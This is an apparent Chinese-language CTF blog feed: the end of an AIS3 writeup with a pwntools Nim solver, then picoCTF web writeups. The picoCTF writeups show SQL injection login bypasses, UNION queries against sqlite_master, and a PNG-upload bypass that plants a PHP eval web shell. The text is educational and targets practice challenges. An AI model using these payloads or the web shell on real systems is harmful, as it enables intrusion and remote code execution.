class="string">&quot;clamp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💾&quot;</span>: <span class="string">&quot;floppy disk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;💽&quot;</span>: <span class="string">&quot;minidisc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;☎️&quot;</span>: <span class="string">&quot;telephone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📟&quot;</span>: <span class="string">&quot;pager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📺&quot;</span>: <span class="string">&quot;television&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📻&quot;</span>: <span class="string">&quot;radio&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🎙️&quot;</span>: <span class="string">&quot;studio microphone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🎚️&quot;</span>: <span class="string">&quot;level slider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🎛️&quot;</span>: <span class="string">&quot;control knobs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⏰&quot;</span>: <span class="string">&quot;alarm clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🕰️&quot;</span>: <span class="string">&quot;mantelpiece clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⌚&quot;</span>: <span class="string">&quot;watch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;📡&quot;</span>: <span class="string">&quot;satellite antenna&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔋&quot;</span>: <span class="string">&quot;battery&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🔌&quot;</span>: <span class="string">&quot;plug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🚩&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⓿&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❶&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❷&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❸&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❹&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❺&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❻&quot;</span>: <span class="string">&quot;6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❼&quot;</span>: <span class="string">&quot;7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❽&quot;</span>: <span class="string">&quot;8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❾&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;❿&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;⭐&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;➕&quot;</span>: <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    <span class="string">&quot;➖&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;✖️&quot;</span>: <span class="string">&quot;×&quot;</span>,</span><br><span class="line">    <span class="string">&quot;➗&quot;</span>: <span class="string">&quot;÷&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我們已經知道了每個符號所對應到的字符，我馬上嘗試使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐱 🚩 (cat flag)</span><br></pre></td></tr></table></figure><p>但可惜題目回應<code>cat: flag: Is a directory</code>，代表這層目錄的 flag 是一個目錄而不是個文件，沒辦法 cat。我推測真正的 flag 是在<code>flag/flag</code>的位置，於是我又嘗試了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐱 🚩/🚩 (cat flag/flag)</span><br></pre></td></tr></table></figure><p>但是題目會擋掉所有非 emoji 所輸入的東西，所以只能透過組合 emoji 去 bypass 這個條件，可是我嘗試了兩天還是不知道要怎麼繞過才能 cat 到 flag 底下的 flag。</p><h2 id="Quantum-Nim-Heist"><a href="#Quantum-Nim-Heist" class="headerlink" title="Quantum Nim Heist"></a>Quantum Nim Heist</h2><p>這題是個尼姆遊戲，我上網查了一下之後發現他是有必勝方法的(有點類似小時候玩那種誰先喊到 21 就贏了的遊戲)。所以我就寫了下面的 exploit script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_move</span>(<span class="params">piles</span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    nim_sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pile <span class="keyword">in</span> piles:</span><br><span class="line">        nim_sum ^= <span class="built_in">int</span>(pile)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nim_sum == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># losing game, make a random move</span></span><br><span class="line">        pile = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(piles) - <span class="number">1</span>)</span><br><span class="line">        count = random.randint(<span class="number">1</span>, <span class="built_in">int</span>(piles[pile]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># winning game, make a winning move</span></span><br><span class="line">        <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(piles):</span><br><span class="line">            v = <span class="built_in">int</span>(v)</span><br><span class="line">            target = v ^ nim_sum</span><br><span class="line">            <span class="keyword">if</span> target &lt; v:</span><br><span class="line">                pile = i</span><br><span class="line">                count = v - target</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (pile, count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chals1.ais3.org&quot;</span>, <span class="number">40004</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;what would you like to do?&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)  <span class="comment"># start</span></span><br><span class="line">    now = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># time.sleep(1)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Loop <span class="subst">&#123;now&#125;</span>&quot;</span>)</span><br><span class="line">        text = r.recvuntil(<span class="string">b&quot;it&#x27;s your turn to move! what do you choose?&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(text.decode())</span><br><span class="line">        r.sendline(<span class="string">b&quot;1&quot;</span>)  <span class="comment"># stop and save</span></span><br><span class="line">        r.recvuntil(<span class="string">b&quot;here is your saved game:\n&quot;</span>)</span><br><span class="line">        line = r.recvline().decode().strip()</span><br><span class="line">        info = line.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        piles = info[<span class="number">0</span>].split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(piles)</span><br><span class="line">        <span class="built_in">hash</span> = info[<span class="number">1</span>]</span><br><span class="line">        which_pile, how_many = get_move(piles)</span><br><span class="line">        r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;enter the saved game:&quot;</span>)</span><br><span class="line">        r.sendline(line.encode())</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;it&#x27;s your turn to move! what do you choose?&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">b&quot;0&quot;</span>)  <span class="comment"># choose to move</span></span><br><span class="line">        which_pile = <span class="built_in">str</span>(which_pile).encode()</span><br><span class="line">        how_many = <span class="built_in">str</span>(how_many).encode()</span><br><span class="line">        <span class="built_in">print</span>(which_pile, how_many)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">type</span>(which_pile), <span class="built_in">type</span>(how_many))</span><br><span class="line">        r.sendline(which_pile)</span><br><span class="line">        r.sendline(how_many)</span><br><span class="line">        now += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure><p>運行了幾次後發現，怎麼每次都是輸阿?難道我寫錯了嗎?</p><p>經過幾次對 ChatGPT 的詠唱發現自己並沒有寫錯，問題是出在我沒有看到題目有給原始碼…。看了一下後發現原來題目在一開始生成遊戲的時候就已經註定了先手(我們)會輸的結局。如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    print_main_menu()</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;what would you like to do? &quot;</span>).strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">        print_rules()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        game = Game()</span><br><span class="line">        game.generate_losing_game() <span class="comment"># 這邊，他生成了我們會輸的遊戲局面</span></span><br><span class="line">        play(game)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        saved = <span class="built_in">input</span>(<span class="string">&quot;enter the saved game: &quot;</span>).strip()</span><br><span class="line">        game_str, digest = saved.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hash</span>.hexdigest(game_str.encode()) == digest:</span><br><span class="line">            game = Game()</span><br><span class="line">            game.load(game_str)</span><br><span class="line">            play(game)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_error(<span class="string">&quot;invalid game provided!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;omg bye!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>至此，我的思路就有點卡住了。本來還以為題目設計可以讓我們中途暫停退出，然後用輸入 hash 值得方式繼續剛才的遊戲是為了讓我們可以判斷一下現在的局面，暫停退出先計算出下一步然後再回來繼續遊戲。結果當 Hint 出來的時候說明不要照著規則玩，我整個就失去方向了，所以最後還是不知道怎麼解的。(到現在在寫 writeup 都還是真的好好奇)</p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><p>這次好像把 Forensic 的題目都放在 Misc 裡面了所以跳過這 Part</p><h1 id="My-Thoughts"><a href="#My-Thoughts" class="headerlink" title="My Thoughts"></a>My Thoughts</h1><p>在這次參賽完之後，我明顯的體認到了自己的不足之處。就是那種，已經很努力了而且賽期也花了絕大部分的時間在比賽上面，成績卻還是不理想。也更加清楚的知道自己還需要修煉，還有很長一段路得走。</p><p>每次參加資安的活動、課程等等，看到那些厲害的學長姐們聚在一起聊天的時候常常會幻想自己有天也能躋身在他們的行列，也是因此，我打算在暑假的時候好好修煉！期待下學期的自己可以多多參加 CTF 比賽，並且爭取得到些成績。在這次暑假中我也會把我每次練習題目的 Writeup 放在我的個人網站上，如果有任何理解錯誤的地方也歡迎大家指正！</p><blockquote><p>Do not go gentle into that good night; Old age should burn and rave at close of day. Rage, rage against the dying of the light.” – <strong><em>Interstellar</em></strong></p></blockquote><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>有鑑於我認為自己在資訊這個領域中，如果能有任何的成就或是進展，很大部分的原因都是站在了許多巨人的肩膀上，所以我會把比賽過程中用到的資源都放上來。</p><p>不僅僅是為了致敬及感謝，更要提醒自己，自己的不足及渺小。</p><ul><li><a href="https://www.books.com.tw/products/0010884220">駭客廝殺不講武德：CTF 強者攻防大戰直擊</a></li><li><a href="https://scist.org/blog/2020/10/27/2020%20SCIST%20Web/">2020&#x2F;10&#x2F;24 Web Security 基礎 題解</a></li><li><a href="https://blog.csdn.net/vanarrow/article/details/107846987">CTF Crypto RSA 算法 入门总结（全）</a></li><li><a href="https://blog.csdn.net/orchid_sea/article/details/134164177">CTF-RSA 加密-1</a></li><li><a href="https://blog.csdn.net/ISHobbyst/article/details/108918079">CTF-Crypto-RSA 基本原理及常见攻击方法</a></li><li><a href="https://blog.csdn.net/qq_45198339/article/details/128741483">CTF 学习笔记——RSA 加密</a></li><li><a href="https://ithelp.ithome.com.tw/articles/10227814">『 Day 29』拜託別 Pwn 我啦！ - Buffer Overflow</a></li><li><a href="https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/">PWN 入門 - buffer overflow 是什麼？</a></li><li><a href="https://mks.tw/2976/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-%E5%BE%9E%E6%AF%AB%E7%84%A1%E5%9F%BA%E7%A4%8E%E9%96%8B%E5%A7%8B-pwn-buffer-overflow">[資訊安全] 從毫無基礎開始 Pwn – Buffer Overflow 實作</a></li><li><a href="https://github.com/pablocelayes/rsa-wiener-attack">rsa-wiener-attack</a></li><li><a href="https://blog.gtwang.org/linux/linux-cut-command-tutorial-and-examples/">Linux 的 cut 擷取部份字元、欄位指令教學與常用範例整理</a></li><li><a href="https://medium.com/vswe/bash-shell-script-cheat-sheet-15ce3cb1b2c7">Bash Script 語法解析</a></li><li><a href="https://www.cnblogs.com/balaamwe/archive/2012/03/15/2397998.html">linux 特殊符号大全</a></li><li><a href="https://blog.csdn.net/u012060033/article/details/104310372">Linux 中特殊符号的作用</a></li><li><a href="https://feifei.tw/learn-linux/">[新手入門] 003 Linux 指令教學</a></li><li><a href="https://www.anquanke.com/post/id/85007">【CTF 攻略】FlappyPig HCTF2016 Writeup</a></li><li><a href="https://blog.csdn.net/mochu7777777/article/details/110004233">BUUCTF：[CFI-CTF 2018]webLogon capture</a></li></ul><p>雖然已經盡力回想及搜尋過程中有用到的資源，但可能還是會有些漏網之魚，還請見諒。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 資安 </tag>
            
            <tag> AIS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>All-in-One PicoCTF Writeups</title>
      <link href="/CTF/All-in-One%20PicoCTF-Writeups/"/>
      <url>/CTF/All-in-One%20PicoCTF-Writeups/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。</p><p>自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題左右才開始打算來寫 writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的 writeup，就這樣啦！希望能幫忙到你。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="unminify"><a href="#unminify" class="headerlink" title="unminify"></a>unminify</h2><p>先看題目，點開後他會說如果你打開了這個網頁，代表你的瀏覽器已經收到了 flag，只是他不知道要怎麼讀取它。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091116470.png" alt="題目"></p><p>既然他說了我們瀏覽器已經收到 flag 了，就打開 F12 看一下網頁代碼吧！點開開發者工具後，直接在 Element 的 Tab 裡面用<code>Ctrl+F</code>搜尋<code>picoCTF</code>字串，結果就直接找到了 XD。欸不是這題也太水了吧！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091535175.png" alt="利用開發者工具搜尋flag"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;pr3tty_c0d3_dbe259ce&#125;</span><br></pre></td></tr></table></figure><h2 id="picobrowser"><a href="#picobrowser" class="headerlink" title="picobrowser"></a>picobrowser</h2><p>這題我們點進 URL 後會看到一個 FLAG 的按鈕，按下去會發現我們不能得到 FLAG。<img src="https://hackmd.io/_uploads/SJB9S0p70.png" alt="題目"><br>他說我們應該要是 picobrowser，所以我就寫了一個 selenium 的 Python 腳本來運行，看看能不能拿到 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">from</span> webdriver_manager.chrome <span class="keyword">import</span> ChromeDriverManager</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">my_user_agent = <span class="string">&quot;picobrowser&quot;</span> <span class="comment"># 這裡把agent改為picobrowser</span></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line">chrome_options.add_argument(<span class="string">f&quot;--user-agent=<span class="subst">&#123;my_user_agent&#125;</span>&quot;</span>)</span><br><span class="line">service = Service(executable_path=ChromeDriverManager().install())</span><br><span class="line">driver = webdriver.Chrome(service=service, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://jupiter.challenges.picoctf.org/problem/28921/flag&quot;</span></span><br><span class="line"></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>這樣就得到 flag 了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;p1c0_s3cr3t_ag3nt_84f9c865&#125;</span><br></pre></td></tr></table></figure><h2 id="SQLiLite"><a href="#SQLiLite" class="headerlink" title="SQLiLite"></a>SQLiLite</h2><p>題目是一個登入頁面。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092406670.png" alt="題目"></p><p>我們先嘗試用<code>admin, admin</code>登入看看。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092632509.png" alt="Login as admin"></p><p>它會說 Login failed，但是我們可以看到它的 SQL 查詢語句是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p>所以我們就可以很輕鬆的用 SQL Injection 啦！這邊使用帳號<code>&#39; OR 1=1--</code>登入就可以啦，密碼不用輸入，或是隨便輸入也行。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093002857.png" alt="Logged in"></p><p>但是他說 flag 在 plainsight 裡面所以我們看不見，那就打開開發者工具用<code>Ctrl+F</code>搜尋吧！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093133835.png" alt="flag"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;L00k5_l1k3_y0u_solv3d_it_d3c660ac&#125;</span><br></pre></td></tr></table></figure><h2 id="More-SQLi"><a href="#More-SQLi" class="headerlink" title="More SQLi"></a>More SQLi</h2><p>把題目 launch 了之後會進入到一個登入頁面，如下圖。</p><p><img src="https://hackmd.io/_uploads/BySNOmYUC.png" alt="題目"></p><p>然後我們先嘗試使用<code>admin</code>作為帳號密碼登入。帳號密碼都輸入<code>admin</code>後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。</p><p><img src="https://hackmd.io/_uploads/r1wnu7KIR.png"></p><p>圖片有點小，總之他顯示的內容就是像下面這樣:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br><span class="line">SQL query: SELECT id FROM users WHERE password = &#x27;admin&#x27; AND username = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p>所以我們在這邊把密碼用<code>&#39;OR 1=1 --</code>這串 payload 作為輸入（帳號可以隨便輸入），整個 SQL 的 query 就會變成這樣:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--&#x27; AND username = &#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure><p>可以從上面的代碼高亮的顏色發現，在<code>1=1</code>後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:</p><p><img src="https://hackmd.io/_uploads/rJjw6XYUC.png"></p><p>他可以查詢 City 的名稱，但其實一筆資料包含了 City, Address, Phone。分析一下後台可能的 SQL 語句，應該是如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> city, address, phone <span class="keyword">FROM</span> &#123;TABLE_NAME&#125; <span class="keyword">WHERE</span> city <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>再來因為題目有告訴我們系統使用的是 SQLite，所以會有一個叫做<code>sqlite_master</code>的表來儲存一些表格的各種資訊。（<a href="https://blog.csdn.net/luoshabugui/article/details/108327936">資訊來源</a>）</p><p>知道這些候我們輸入<code>&#39; UNION SELECT name, sql, 1337 FROM sqlite_master; --</code>讓整個 SQL 語句變成如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> city, address, phone <span class="keyword">FROM</span> &#123;TABLE_NAME&#125; <span class="keyword">WHERE</span> city <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> name, <span class="keyword">sql</span>, <span class="number">1337</span> <span class="keyword">FROM</span> sqlite_master; <span class="comment">--&#x27;;</span></span><br></pre></td></tr></table></figure><p>這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是 sqlite_master 的表格內容，如下:</p><p><img src="https://hackmd.io/_uploads/BysgmNY8R.png" alt="找到flag所在的表格了"></p><p>我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload<code>&#39; UNION SELECT 1, flag, 1 FROM more_table; --</code>。輸入後就可以看到以下的介面啦！</p><p><img src="https://hackmd.io/_uploads/SyoSNNtLA.png" alt="flag"></p><p>flag 就找到囉！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a&#125;</span><br></pre></td></tr></table></figure><h2 id="Trickster"><a href="#Trickster" class="headerlink" title="Trickster"></a>Trickster</h2><p>這題的題目是一個可以上傳 png 的網頁，看起來就是文件上船漏洞，頁面如下:</p><p><img src="https://hackmd.io/_uploads/HkocKNtIA.png" alt="題目"></p><p><del>秉持著不知道要幹嘛的時候先掃路徑的精神</del>，可以找到它的 robots.txt，它其中禁止了兩個路徑，如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /instructions.txt</span><br><span class="line">Disallow: /uploads/</span><br></pre></td></tr></table></figure><p>既然它都禁止了，我們就去看看吧 XD。<code>/uploads/</code>應該就是它的上船後的文件路徑了，而它 instructions.txt 的內容如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s create a web app for PNG Images processing.</span><br><span class="line">It needs to:</span><br><span class="line">Allow users to upload PNG images</span><br><span class="line">look for &quot;.png&quot; extension in the submitted files</span><br><span class="line">make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain &#x27;PNG&#x27; in hexadecimal: &quot;50 4E 47&quot; )</span><br><span class="line">after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.</span><br></pre></td></tr></table></figure><p>所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為<code>.png</code>；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為<code>50 4E 47</code>。</p><p>知道了這些信息後，我們先隨便找一張 png 圖片上傳看看吧！（我這邊直接隨便截圖，並命名為<code>hack.png</code>）。並且在 upload 的過程中用 Burp suite 去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為<code>hack.png.php</code>，並在檔案內容的 PNG 以下添加這個<a href="https://xz.aliyun.com/t/6957?time__1311=n4+xnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https://www.google.com/">php 一句話木馬</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>整個修改完後如下（點開來看可能會比較清楚）:</p><p><img src="https://hackmd.io/_uploads/Sy7rFrYU0.png" alt="一句話木馬"></p><p>上傳完成後，現在這個 shell 就會位於<code>https://my_instance_url/uploads/hack.png.php</code>這個位置上啦。</p><p>接下來再用<a href="https://github.com/AntSwordProject/antSword">中國蟻劍</a>這款工具去連接那個 web shell 就可以啦，連接過程如下:</p><p><img src="https://hackmd.io/_uploads/HJo4cSF8A.png" alt="輸入連接資訊"></p><p>連接完成後，就可以直接看一下網站的文件，看到以下這個<code>.txt</code>應該就是 flag 了。</p><p><img src="https://hackmd.io/_uploads/SyahqSYLR.png" alt="貌似是flag的文件"></p><p><img src="https://hackmd.io/_uploads/HJW1sBtI0.png" alt="flag出來了"></p><p>於是我們就成功找到了 flag 啦！如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 